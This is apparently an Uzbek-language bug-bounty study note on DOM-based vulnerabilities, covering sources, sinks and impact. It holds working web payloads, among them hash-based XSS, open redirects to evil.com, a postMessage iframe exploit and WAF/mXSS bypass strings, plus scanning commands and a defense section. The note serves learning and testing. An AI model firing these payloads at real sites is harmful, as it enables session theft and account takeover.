# DOM-Based Vulnerabilities

> Lab yechimlari (PortSwigger'ning 7 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Zaiflik **butunlay brauzerda, client-side JavaScript'da** sodir bo'ladi. Sening boshqaradigan
ma'lumoting (**source** — URL, hash, postMessage) sayt JS'i tomonidan olinib, **xavfli funksiyaga
(sink)** uzatiladi (masalan `innerHTML`, `eval`, `location`). Server bu jarayonга umuman aralashmaydi
— HTTP javobi o'zgarmaydi.

**Ildiz sabab:** JS ishonchsiz manbadan olingan ma'lumotni tozalamay xavfli sink'ga beradi. Muhimi —
**server-side skanerlar buni KO'RMAYDI** (javob o'zgarmaydi), shuning uchun avtomat tool va ko'p
hunter o'tkazib yuboradi. Qo'lda source→sink oqimini kuzatib topasan — raqobat kam, qiymat yuqori.

## Qanday ishlaydi (source → sink)
```js
// Zaif kod:
document.getElementById('out').innerHTML = location.hash.slice(1);   // source=hash, sink=innerHTML
// Kiritasan:
https://target.com/#<img src=x onerror=alert(document.cookie)>
```

## Turlari (sink → oqibat bo'yicha)
- **DOM XSS** — source → JS-exec sink (`eval`, `innerHTML`, `document.write`, `setTimeout`, jQuery `html()`).
- **DOM Open Redirect** — source → `location`/`location.href` → boshqa saytga yo'naltirish.
- **DOM-based Cookie manipulation** — source → `document.cookie` → cookie zaharlash.
- **Web message (postMessage)** — `message` listener `e.origin` ni tekshirmay `e.data` ni sink'ga beradi.
- **DOM Clobbering** — HTML `id`/`name` atributlari JS o'zgaruvchisini "clobber" qilib logikani buzadi.
- **JavaScript injection / link manipulation / AngularJS (CSTI)** — frameworkga xos variantlar.

## Oqibatlar (IMPACT) — nega bu muhim
- **DOM XSS** → cookie/session o'g'irlash, ATO (02_XSS bilan bir xil zarba).
- **DOM Open Redirect** → OAuth token o'g'irlash, fishing zanjiri.
- **postMessage zaifligi** → boshqa (attacker) domendan XSS yuborish.
- **DOM Clobbering** → sanitizer bypass → XSS.
> Server-side skaner topolmagani uchun raqobat past. Severity sink turiga qarab Medium–High.

## Source (sen boshqaradigan)
```
location.href, location.search, location.hash, document.URL, document.referrer,
window.name, document.cookie, postMessage event.data, localStorage
```

## Sink (xavfli joy)
```
XSS:      eval, setTimeout, Function, innerHTML, outerHTML, document.write,
          insertAdjacentHTML, $(...).html(), $.parseHTML
Redirect: location, location.href, location.assign/replace, window.open
```

## Aniqlash
```bash
grep -rEn "innerHTML|document.write|eval\(|location.hash|postMessage" ./js/
```
> JS ichida source→sink oqimini qidirasan. DevTools'da `innerHTML`'ga breakpoint qo'y.

## Exploit

### DOM XSS (hash orqali)
```js
// Zaif kod: document.getElementById('out').innerHTML = location.hash.slice(1);
https://target.com/#<img src=x onerror=alert(document.domain)>
```

### DOM Open Redirect
```js
// Zaif: location = params.get('next');
https://target.com/?next=https://evil.com
https://target.com/?next=//evil.com
https://target.com/?next=javascript:alert(1)
```

### postMessage (origin tekshirmasa)
```html
<iframe src="https://target.com" id="f"></iframe>
<script>f.onload=()=>f.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')</script>
```
> Listener `e.origin` ni tekshirmasa — istagan domendan XSS tiqasan.

## WAF/sanitizer bypass
```
#<img src=x onerror=alert(1)>    <!-- hash server'ga bormaydi → WAF ko'rmaydi -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">   <!-- mXSS -->
```

## TOOLLAR

### Burp DOM Invader — DOM XSS'ning podshosi
```
Burp brauzer → DOM Invader yoqib qo'y → sahifaga kir
```
> Source→sink oqimini real vaqtda avtomat kuzatadi, ishlaydigan payloadni o'zi aytadi. postMessage va prototype pollution gadget'larini ham topadi.

### katana + nuclei — ommaviy DOM XSS
```bash
katana -u https://target.com -jc -d 3 | nuclei -t ~/nuclei-templates/http/vulnerabilities/ -tags dom
```
> Crawl qilib, DOM XSS shablonlari bilan uradi.

### LinkFinder — JS'dagi source/sink qidirish
```bash
python3 linkfinder.py -i https://target.com/app.js -o cli
```
> Endpoint bilan birga xavfli funksiya chaqiruvlarini ham ko'rsatadi.

### grep — qo'lda tez audit
```bash
curl -s https://target.com/app.js | grep -nE "location\.(hash|search)|innerHTML|eval"
```
> JS'ni tortib, source va sink bitta ekranda — qo'lda zanjirni tuzasan.

## Himoya
`textContent` ishlat (`innerHTML` emas), `postMessage`'da `e.origin` tekshir, DOMPurify,
`location`ga user input berma, allowlist redirect.
